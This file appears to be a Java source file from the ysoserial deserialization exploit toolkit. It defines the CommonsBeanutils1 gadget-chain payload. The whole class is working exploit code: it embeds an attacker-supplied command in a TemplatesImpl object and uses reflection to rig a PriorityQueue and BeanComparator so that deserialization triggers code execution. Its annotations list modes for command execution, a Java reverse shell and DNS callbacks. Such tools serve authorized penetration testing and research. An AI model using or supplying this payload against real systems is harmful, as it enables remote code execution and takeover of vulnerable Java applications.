package ysoserial.payloads;

import java.math.BigInteger;
import java.util.PriorityQueue;

import org.apache.commons.beanutils.BeanComparator;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.DynamicCommands;
import ysoserial.payloads.util.Gadgets;

import ysoserial.payloads.util.ObjectPayload;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@SuppressWarnings({ "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF })
@DynamicCommands({DynamicCommands.EXEC_GLOBAL, DynamicCommands.EXEC_WIN, DynamicCommands.EXEC_UNIX, DynamicCommands.JAVA_REVERSE_SHELL, DynamicCommands.SLEEP, DynamicCommands.DNS})
public class CommonsBeanutils1 implements ObjectPayload<Object> {

	public Object getObject(final String command, String attackType) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command, attackType);
		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Reflections.setFieldValue(comparator, "property", "outputProperties");

		// switch contents of queue
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils1.class, args);
	}
}
